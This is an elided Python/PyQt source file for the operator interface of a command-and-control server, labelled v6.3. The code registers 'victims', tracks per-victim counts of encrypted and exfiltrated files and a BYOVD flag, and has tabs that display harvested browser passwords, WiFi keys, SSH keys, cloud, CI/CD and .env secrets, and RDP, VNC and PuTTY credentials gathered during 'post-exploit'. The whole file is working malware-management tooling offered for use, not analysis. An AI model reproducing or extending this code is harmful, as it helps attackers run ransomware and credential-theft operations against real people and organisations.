...
class C2ServerThread(QThread):
    ...
    victim_registered = pyqtSignal(dict)  # ═══ FIX v6.3 ═══
    ...
    def run(self):
        try:
            ...
            # ═══ FIX v6.3: Hook callback victim register ═══
            self.server.on_victim_registered = self._on_server_victim_registered
            ...
            self.output.emit(f"[*] Post-exploit dir: {self.server.post_exploit_dir}")
    ...
    def _on_server_victim_registered(self, victim_info):
        """Forward callback ke Qt signal (thread-safe)."""
        try:
            self.victim_registered.emit(dict(victim_info))
        except Exception as e:
            self.output.emit(f"[!] victim_registered emit error: {e}")
...
class C2Dialog(QDialog):
    """C2 Server Dialog v6.3 - Split Layout with Separate Console Window + Post-Exploit"""
    ...
    def _build_ui(self):
        ...
        # Tombol buka credentials viewer
        self.open_creds_btn = QPushButton("🔑 Credentials Viewer")
        self.open_creds_btn.setFixedHeight(32)
        self.open_creds_btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
        ...
        """)
        self.open_creds_btn.clicked.connect(self._open_credentials_viewer)
        title_layout.addWidget(self.open_creds_btn)
        ...
        # ═══════════════ BOTTOM INFO ═══════════════
        bottom = QLabel(
            "💡 Selected Victim Actions (right) for per-victim commands. "
            "Bulk Actions (bottom) for all victims. "
            "Console/Hybrid/History/Exfil via 📟 button. "
            "Credentials via 🔑 button."
        )
    ...
    def _build_config_panel(self):
        ...
        self.open_postex_btn = QPushButton("🎯 Open Post-Exploit Folder")
        self.open_postex_btn.setMinimumHeight(32)
        self.open_postex_btn.setStyleSheet("""
            QPushButton {
                background: #ffaa00;
                color: #000;
                font-weight: bold;
        ...
        """)
        self.open_postex_btn.clicked.connect(self._open_postex_folder)
        quick_layout.addWidget(self.open_postex_btn)
    ...
    def _build_victims_table(self):
        ...
        self.victims_table.setColumnCount(14)
        ...
        widths = [70, 115, 115, 65, 85, 50, 95, 85, 45, 45, 55, 85, 85, 65]
    ...
    def _build_selected_actions_panel(self):
        ...
        # ─── POST-EXPLOIT GROUP ───
        postex_group = QGroupBox("🎯 Post-Exploit")
        postex_group.setStyleSheet(self._group_style("#ffaa00"))
        postex_layout = QGridLayout()
        postex_layout.setSpacing(4)
        postex_layout.setContentsMargins(6, 14, 6, 6)

        self.sel_viewcreds_btn = self._make_action_btn(
            "🔑 View Creds", "#ffaa00", lambda: self._view_selected_creds()
        )
        postex_layout.addWidget(self.sel_viewcreds_btn, 0, 0, 1, 2)

        self.sel_viewpostex_btn = self._make_action_btn(
            "🎯 View Post-Ex", "#ffaa00", lambda: self._view_selected_postex()
        )
        postex_layout.addWidget(self.sel_viewpostex_btn, 1, 0, 1, 2)
    ...
    def _open_console_window(self):
        ...
        # Credentials tab
        creds_widget = self._build_credentials_tab()
        tabs.addTab(creds_widget, "🔑 Credentials")

        # Post-Exploit tab
        postex_widget = self._build_postex_tab()
        tabs.addTab(postex_widget, "🎯 Post-Exploit")
    ...
    def _build_credentials_tab(self):
        ...
        info_text = QLabel(
            "<b style='color: #ffaa00;'>Harvested Credentials</b><br>"
            "<span style='color: #888;'>Browser, WiFi, SSH, Cloud, "
            "Git, Docker, K8s, etc. from post-exploit phase.</span>"
        )
        info_text.setStyleSheet(
            "color: #ccc; font-size: 9pt; background: transparent; border: none;"
        )
        ...
        open_folder_btn = QPushButton("📂 Open Post-Exploit Folder")
        ...
        open_folder_btn.setStyleSheet("""
            ...
            QPushButton:hover { background: #2ea043; }
        """)
        open_folder_btn.clicked.connect(self._open_postex_folder)
        toolbar.addWidget(open_folder_btn)

        self.creds_info_label = QLabel("0 victims with data")
        self.creds_info_label.setStyleSheet(
            "color: #ffaa00; font-size: 9pt; font-weight: bold; padding-left: 10px;"
        )
        toolbar.addWidget(self.creds_info_label)
        toolbar.addStretch()

        layout.addLayout(toolbar)

        # Victims list
        self.creds_victims_table = QTableWidget()
        self.creds_victims_table.setColumnCount(6)
        self.creds_victims_table.setHorizontalHeaderLabels(
            ["Victim ID", "Hostname", "IP:Port", "Creds", "Users", "Shares"]
        )
        self.creds_victims_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Interactive
        )
        self.creds_victims_table.setEditTriggers(
            QAbstractItemView.EditTrigger.NoEditTriggers
        )
        self.creds_victims_table.setSelectionBehavior(
            QAbstractItemView.SelectionBehavior.SelectRows
        )
        self.creds_victims_table.setAlternatingRowColors(True)
        self.creds_victims_table.setStyleSheet("""
            QTableWidget {
                background: #0d1117;
                alternate-background-color: #0a0d12;
                color: #e6edf3;
            ...
            QTableWidget::item:selected { background: #ffaa00; color: #000; }
            QHeaderView::section {
                background: #1a1a1a;
                color: #ffaa00;
                padding: 5px;
        ...
        """)
        self.creds_victims_table.itemSelectionChanged.connect(
            self._on_creds_victim_selected
        )
        self.creds_victims_table.itemDoubleClicked.connect(
            self._on_creds_victim_double_clicked
        )
        layout.addWidget(self.creds_victims_table, 1)

        # Credentials detail
        detail_label = QLabel("📋 Credentials Detail")
        detail_label.setStyleSheet(
            "color: #ffaa00; font-size: 10pt; font-weight: bold; padding: 4px;"
        )
        layout.addWidget(detail_label)

        self.creds_detail_text = QTextEdit()
        self.creds_detail_text.setReadOnly(True)
        self.creds_detail_text.setFont(QFont("Consolas", 9))
        self.creds_detail_text.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
        ...
        """)
        layout.addWidget(self.creds_detail_text, 2)
    ...
    def _build_postex_tab(self):
        ...
        info_text = QLabel(
            "<b style='color: #00ffff;'>Post-Exploitation Data</b><br>"
            "<span style='color: #888;'>Credentials + Discovery + Exfil "
            "results per victim.</span>"
        )
        info_text.setStyleSheet(
            "color: #ccc; font-size: 9pt; background: transparent; border: none;"
        )
        ...
        """)
        refresh_btn.clicked.connect(self._refresh_postex_list)
        toolbar.addWidget(refresh_btn)
        ...
        self.postex_info_label = QLabel("0 post-exploit files")
        self.postex_info_label.setStyleSheet(
            "color: #00ffff; font-size: 9pt; font-weight: bold; padding-left: 10px;"
        )
        toolbar.addWidget(self.postex_info_label)
        toolbar.addStretch()

        layout.addLayout(toolbar)

        # Post-ex files table
        self.postex_table = QTableWidget()
        self.postex_table.setColumnCount(5)
        self.postex_table.setHorizontalHeaderLabels(
            ["Victim", "Hostname", "OS", "Creds", "Timestamp"]
        )
        self.postex_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.Stretch
        )
        self.postex_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.postex_table.setSelectionBehavior(
            QAbstractItemView.SelectionBehavior.SelectRows
        )
        self.postex_table.setAlternatingRowColors(True)
        self.postex_table.setStyleSheet("""
            QTableWidget {
                background: #0d1117;
                alternate-background-color: #0a0d12;
                color: #e6edf3;
            ...
            QTableWidget::item:selected { background: #00ffff; color: #000; }
            QHeaderView::section {
                background: #1a1a1a;
                color: #00ffff;
                padding: 5px;
        ...
        """)
        self.postex_table.itemDoubleClicked.connect(self._on_postex_double_clicked)
        layout.addWidget(self.postex_table, 1)

        # Detail view
        detail_label = QLabel("📋 Post-Exploit Detail")
        detail_label.setStyleSheet(
            "color: #00ffff; font-size: 10pt; font-weight: bold; padding: 4px;"
        )
        layout.addWidget(detail_label)

        self.postex_detail_text = QTextEdit()
        self.postex_detail_text.setReadOnly(True)
        self.postex_detail_text.setFont(QFont("Consolas", 9))
        self.postex_detail_text.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
        ...
        """)
        layout.addWidget(self.postex_detail_text, 2)
    ...
    def _build_exfil_tab(self):
        ...
        info = QLabel("💡 Double-click file to open.")
    ...
    def _start_server(self):
        ...
        if len(password) < 4:
            QMessageBox.warning(self, "Warning", "Password too short (min 4 chars).")
            return
        ...
        # ═══ FIX v6.3: Hubungkan victim_registered ═══
        self.server_thread.victim_registered.connect(self._on_victim_registered)
        ...
        self._append_output("[+] Post-exploit storage: post_exploit/")
        self._append_output("[+] Credentials viewer: 🔑 button")
            ...
            try:
                ...
                for vid, v in server.victims.items():
                    victims[vid] = {
                        ...
                        "is_admin": v.get("is_admin", False),
                        "status": v.get("status", "unknown"),
                        "registered": v.get("registered", False),  # ═══ FIX ═══
                        "encrypted": v.get("encrypted", False),
                        "encrypted_count": v.get("encrypted_count", 0),
                        "exfiltrated_count": v.get("exfiltrated_count", 0),
                        "byovd_enabled": v.get("byovd_enabled", False),
                ...
                total_creds = sum(
                    v.get("creds_count", 0) for v in server.victims.values()
                )
    ...
    def _open_postex_folder(self):
        folder = os.path.join(os.getcwd(), "post_exploit")
        if not os.path.exists(folder):
            os.makedirs(folder, exist_ok=True)
        try:
            if os.name == "nt":
                ...
                subprocess.Popen(["xdg-open", folder])
            self._append_output(f"[*] Opened post-exploit folder: {folder}")
        except Exception as e:
            self._append_output(f"[!] Cannot open folder: {e}")
    ...
    def _open_credentials_viewer(self):
        """Open standalone credentials viewer window."""
        self._open_console_window()
        if self._console_window is not None:
            try:
                for child in self._console_window.findChildren(QTabWidget):
                    for i in range(child.count()):
                        if "Credentials" in child.tabText(i):
    ...
    def _refresh_credentials_list(self):
        """Refresh credentials list from post_exploit dir."""
        if not hasattr(self, "creds_victims_table"):
            return

        self.creds_victims_table.setRowCount(0)

        postex_dir = os.path.join(os.getcwd(), "post_exploit")
        if not os.path.isdir(postex_dir):
            self.creds_info_label.setText("0 victims with data")
            return

        entries = []
        for fname in os.listdir(postex_dir):
            if not fname.endswith("_post_exploit.json"):
                continue
            try:
                fpath = os.path.join(postex_dir, fname)
                ...
                sys_info = (
                    discovery.get("system", {}) if isinstance(discovery, dict) else {}
                )
                hostname = sys_info.get("hostname", "?")
                users_list = []
                if isinstance(discovery, dict):
                    users_data = discovery.get("users", {})
                    if isinstance(users_data, dict):
                        users_list = users_data.get("users", [])
                shares_list = []
                if isinstance(discovery, dict):
                    shares_data = discovery.get("shares", {})
                    if isinstance(shares_data, dict):
                        shares_list = shares_data.get("local", [])
        ...
        self.creds_victims_table.setRowCount(len(entries))

        for row, entry in enumerate(entries):
            vid_item = QTableWidgetItem(entry["victim_id"])
            vid_item.setForeground(QColor("#ffaa00"))
            vid_item.setFont(QFont("Consolas", 9, QFont.Weight.Bold))
            vid_item.setData(Qt.ItemDataRole.UserRole, entry["file"])
            self.creds_victims_table.setItem(row, 0, vid_item)

            host_item = QTableWidgetItem(entry["hostname"])
            host_item.setForeground(QColor("#8be9fd"))
            self.creds_victims_table.setItem(row, 1, host_item)

            sys_info = entry["data"].get("discovery", {}).get("system", {})
            ip_item = QTableWidgetItem(sys_info.get("ip", "?"))
            self.creds_victims_table.setItem(row, 2, ip_item)

            creds_item = QTableWidgetItem(str(entry["creds_count"]))
            creds_item.setForeground(QColor("#ffff00"))
            creds_item.setFont(QFont("Consolas", 9, QFont.Weight.Bold))
            creds_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            self.creds_victims_table.setItem(row, 3, creds_item)

            users_item = QTableWidgetItem(str(entry["users_count"]))
            users_item.setForeground(QColor("#00ffff"))
            users_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            self.creds_victims_table.setItem(row, 4, users_item)

            shares_item = QTableWidgetItem(str(entry["shares_count"]))
            shares_item.setForeground(QColor("#bd93f9"))
            shares_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            self.creds_victims_table.setItem(row, 5, shares_item)

        self.creds_info_label.setText(f"{len(entries)} victims with data")

        if entries:
            self.creds_victims_table.selectRow(0)

    def _on_creds_victim_selected(self):
        """Show credentials detail for selected victim."""
        if not hasattr(self, "creds_detail_text"):
            return

        selected = self.creds_victims_table.selectedItems()
        if not selected:
            return

        row = selected[0].row()
        fname_item = self.creds_victims_table.item(row, 0)
        if not fname_item:
            return

        fname = fname_item.data(Qt.ItemDataRole.UserRole)
        if not fname:
            return
        ...
        try:
            ...
            self.creds_detail_text.setPlainText(f"Error: {e}")
            return

        html = self._build_credentials_html(data)
        self.creds_detail_text.setHtml(html)

    def _on_creds_victim_double_clicked(self, item):
        """Open file when double-click."""
        row = item.row()
        fname_item = self.creds_victims_table.item(row, 0)
        if not fname_item:
            return
    ...
    def _build_credentials_html(self, data):
        """Build HTML view of credentials."""
        creds = data.get("credentials", {})
        discovery = data.get("discovery", {})
        ...
        html = """
        <html><head><style>
            body { font-family: 'Consolas', monospace; font-size: 12px; color: #e6edf3; padding: 8px; }
            .section { margin-bottom: 16px; }
            .section-title { color: #ffaa00; font-weight: bold; font-size: 14px; margin-bottom: 6px; border-bottom: 1px solid #333; padding-bottom: 3px; }
            .sub-title { color: #00ffff; font-weight: bold; margin: 8px 0 4px 0; }
            .cred { background: #161b22; padding: 6px 8px; margin: 3px 0; border-radius: 4px; border-left: 3px solid #ffaa00; }
            .cred-browser { color: #39c5cf; font-weight: bold; }
            .cred-url { color: #8b949e; word-break: break-all; }
            .cred-user { color: #d29922; }
            .cred-pass { color: #3fb950; font-weight: bold; }
            .info { background: #0d1117; padding: 6px; border-radius: 4px; margin: 3px 0; }
            .key-block { background: #0d1117; padding: 6px; border-radius: 4px; margin: 3px 0; max-height: 150px; overflow: auto; }
            .key-title { color: #d29922; font-weight: bold; margin-bottom: 3px; }
            .key-content { color: #3fb950; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
            pre { color: #3fb950; font-size: 11px; margin: 0; white-space: pre-wrap; word-break: break-all; }
        </style></head><body>
        """

        if metadata:
            html += f'<div class="section">'
            html += f'<div class="section-title">📊 Metadata</div>'
            html += f'<div class="info"><b>Hostname:</b> {metadata.get("hostname", "?")}</div>'
            html += f'<div class="info"><b>User:</b> {metadata.get("user", "?")}</div>'
            html += f'<div class="info"><b>OS:</b> {metadata.get("os", "?")}</div>'
            html += f'<div class="info"><b>Timestamp:</b> {metadata.get("timestamp", "?")}</div>'
            html += f"</div>"

        browser = creds.get("browser", [])
        if browser:
            html += f'<div class="section">'
            html += f'<div class="section-title">🌐 Browser Credentials ({len(browser)})</div>'
            for c in browser[:100]:
                html += f'<div class="cred">'
                html += f'<span class="cred-browser">{c.get("browser", "?")}</span> | '
                html += f'<span class="cred-url">{c.get("url", "")[:100]}</span> | '
                html += f'<span class="cred-user">{c.get("username", "")}</span> | '
                html += f'<span class="cred-pass">{c.get("password", "")}</span>'
                html += f"</div>"
            if len(browser) > 100:
                html += f'<div class="info">... and {len(browser) - 100} more</div>'
            html += f"</div>"

        wifi = creds.get("wifi", [])
        if wifi:
            html += f'<div class="section">'
            html += f'<div class="section-title">📶 WiFi Passwords ({len(wifi)})</div>'
            for w in wifi:
                html += f'<div class="cred">'
                html += f'<span class="cred-user">{w.get("ssid", "?")}</span> | '
                html += f'<span class="cred-pass">{w.get("password", "")}</span>'
                html += f"</div>"
            html += f"</div>"
        ...
        if ssh:
            html += f'<div class="section">'
            html += f'<div class="section-title">🔐 SSH Keys ({len(ssh)})</div>'
            for s in ssh:
                html += f'<div class="key-block">'
                html += f'<div class="key-title">{s.get("file", "")}</div>'
                html += f'<div class="key-content">{s.get("content", "")[:500]}</div>'
                html += f"</div>"
            html += f"</div>"
        ...
        if cloud:
            html += f'<div class="section">'
            html += (
                f'<div class="section-title">☁️ Cloud Credentials ({len(cloud)})</div>'
            )
            for c in cloud:
                html += f'<div class="key-block">'
                html += f'<div class="key-title">{c.get("provider", "")}</div>'
                html += f'<div class="key-content">{c.get("content", "")[:500]}</div>'
                html += f"</div>"
            html += f"</div>"
        ...
        for key, display in [
            ...
            ("ci_cd", "🔧 CI/CD"),
            ("env_files", "🔑 .env Files"),
            ("database_clients", "🗄️ Database"),
            ("shell_history", "📜 Shell History"),
            ("putty", "🖥️ PuTTY"),
            ("winscp", "🖥️ WinSCP"),
            ("filezilla", "🖥️ FileZilla"),
            ("vnc", "🖥️ VNC"),
            ("rdp", "🖥️ RDP"),
        ]:
            items = creds.get(key, [])
            if items:
                html += f'<div class="section">'
                html += f'<div class="section-title">{display} ({len(items)})</div>'
                for item in items[:30]:
                    ...
                    html += f'<div class="key-title">{title}</div>'
                    content = item.get("content", "") or str(item)
                    html += f'<div class="key-content">{content[:300]}</div>'
                    html += f"</div>"
                html += f"</div>"
    ...
    def _refresh_postex_list(self):
        """Refresh post-exploit list."""
        if not hasattr(self, "postex_table"):
            return

        self.postex_table.setRowCount(0)

        postex_dir = os.path.join(os.getcwd(), "post_exploit")
        if not os.path.isdir(postex_dir):
            self.postex_info_label.setText("0 post-exploit files")
            return

        entries = []
        for fname in sorted(os.listdir(postex_dir)):
            if not fname.endswith("_post_exploit.json"):
                continue
            try:
                fpath = os.path.join(postex_dir, fname)
        ...
        self.postex_table.setRowCount(len(entries))
        ...
        for row, entry in enumerate(entries):
            ...
            vid_item.setFont(QFont("Consolas", 9, QFont.Weight.Bold))
            vid_item.setData(Qt.ItemDataRole.UserRole, entry["file"])
            self.postex_table.setItem(row, 0, vid_item)

            host_item = QTableWidgetItem(entry["hostname"])
            host_item.setForeground(QColor("#8be9fd"))
            self.postex_table.setItem(row, 1, host_item)

            os_item = QTableWidgetItem(entry["os"])
            os_item.setForeground(QColor("#bd93f9"))
            self.postex_table.setItem(row, 2, os_item)

            creds_item = QTableWidgetItem(str(entry["creds_count"]))
            creds_item.setForeground(QColor("#ffff00"))
            creds_item.setFont(QFont("Consolas", 9, QFont.Weight.Bold))
            creds_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            self.postex_table.setItem(row, 3, creds_item)

            ts_item = QTableWidgetItem(entry["timestamp"])
            ts_item.setForeground(QColor("#888888"))
            self.postex_table.setItem(row, 4, ts_item)

        self.postex_info_label.setText(f"{len(entries)} post-exploit files")

    def _on_postex_double_clicked(self, item):
        """Show detail when double-click."""
        row = item.row()
        fname_item = self.postex_table.item(row, 0)
        if not fname_item:
            return
        ...
        if hasattr(self, "postex_detail_text"):
            html = self._build_credentials_html(data)
            self.postex_detail_text.setHtml(html)
    ...
    def _view_selected_creds(self):
        """Show credentials for selected victim."""
        if not self.current_selected_victim:
            QMessageBox.warning(self, "Warning", "No victim selected")
            return

        victim_id = self.current_selected_victim

        postex_dir = os.path.join(os.getcwd(), "post_exploit")
        if not os.path.isdir(postex_dir):
            QMessageBox.information(
                self, "Info", f"No post-exploit data for {victim_id}"
            )
            return

        found = False
        for fname in os.listdir(postex_dir):
            if fname.startswith(victim_id) and fname.endswith("_post_exploit.json"):
                self._open_console_window()
                if self._console_window is not None:
                    try:
                        for child in self._console_window.findChildren(QTabWidget):
                            ...
                            break
                        self._refresh_credentials_list()
                        for row in range(self.creds_victims_table.rowCount()):
                            item = self.creds_victims_table.item(row, 0)
                            if item and victim_id in item.text():
                                self.creds_victims_table.selectRow(row)
                                break
                        found = True
                    except Exception:
                        pass
    ...
    def _view_selected_postex(self):
        """Show post-exploit data for selected victim."""
        if not self.current_selected_victim:
            QMessageBox.warning(self, "Warning", "No victim selected")
            return
            ...
            if fname.startswith(victim_id) and fname.endswith("_post_exploit.json"):
                ...
                if self._console_window is not None:
                    try:
                        for child in self._console_window.findChildren(QTabWidget):
                            for i in range(child.count()):
                                if "Post-Exploit" in child.tabText(i):
                                    child.setCurrentIndex(i)
                                    break
                            break
                        self._refresh_postex_list()
                        for row in range(self.postex_table.rowCount()):
                            item = self.postex_table.item(row, 0)
                            if item and victim_id in item.text():
                                self.postex_table.selectRow(row)
                                break
                        found = True
                    except Exception:
                        pass
    ...
    def _on_victim_update(self, data):
        try:
            ...
            if self._console_window is not None:
                ...
                self._creds_refresh_counter += 1
                if self._creds_refresh_counter >= 2:
                    self._creds_refresh_counter = 0
                    try:
                        self._refresh_credentials_list()
                        self._refresh_postex_list()
    ...
    # ═══ FIX v6.3: Victim register handler ═══
    def _on_victim_registered(self, victim_info):
        """Handle victim register event — immediate refresh + notif."""
        try:
            vid = victim_info.get("id", "?")
            hostname = victim_info.get("hostname", "unknown")
            os_type = victim_info.get("os", "unknown")
            user = victim_info.get("user", "unknown")
            ip = victim_info.get("ip", "?")
            port = victim_info.get("port", "?")

            self._append_output(
                f"[+] Victim registered: {vid} | "
                f"{hostname} ({os_type}) | user={user} @ {ip}:{port}"
            )

            QTimer.singleShot(100, self._refresh_after_register)

        except Exception as e:
            self._append_output(f"[!] _on_victim_registered error: {e}")

    def _refresh_after_register(self):
        """Force refresh victims table + stats dari server."""
        try:
            if not self.server_thread or not self.server_thread.server:
                return
            server = self.server_thread.server
            ...
            self._append_output(f"[!] _refresh_after_register error: {e}")
    ...
    def _update_victims_table(self, victims):
        ...
        for row, (vid, v) in enumerate(sorted(victims.items())):
            ...
            # ═══ FIX v6.3: Status "registering" kalau connected belum register ═══
            status = v.get("status", "unknown")
            registered = v.get("registered", False)

            if status == "connected" and not registered:
            ...
            creds_count = (
                str(v.get("creds_count", 0)) if v.get("creds_count", 0) > 0 else "-"
            )
            creds_item = QTableWidgetItem(creds_count)
            if v.get("creds_count", 0) > 0:
                creds_item.setForeground(QColor("#ffcc00"))
                creds_item.setFont(QFont("Consolas", 9, QFont.Weight.Bold))
            creds_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            self.victims_table.setItem(row, 10, creds_item)

            vid_text = v.get("victim_id", "") or "-"
            vid_item = QTableWidgetItem(vid_text)
            vid_item.setForeground(QColor("#00ffff"))
            vid_item.setFont(QFont("Consolas", 8, QFont.Weight.Bold))
            self.victims_table.setItem(row, 11, vid_item)

            fp_text = v.get("key_fingerprint", "") or "-"
            fp_item = QTableWidgetItem(fp_text)
            fp_item.setForeground(QColor("#ffff00"))
            self.victims_table.setItem(row, 12, fp_item)
            ...
            self.victims_table.setItem(row, 13, mode_item)
    ...
    def _on_victim_selected(self):
        ...
        if item:
            ...
            if creds_count > 0:
                info_text += f"<br><span style='color:#ffaa00'>🔑 {creds_count} credentials</span>"
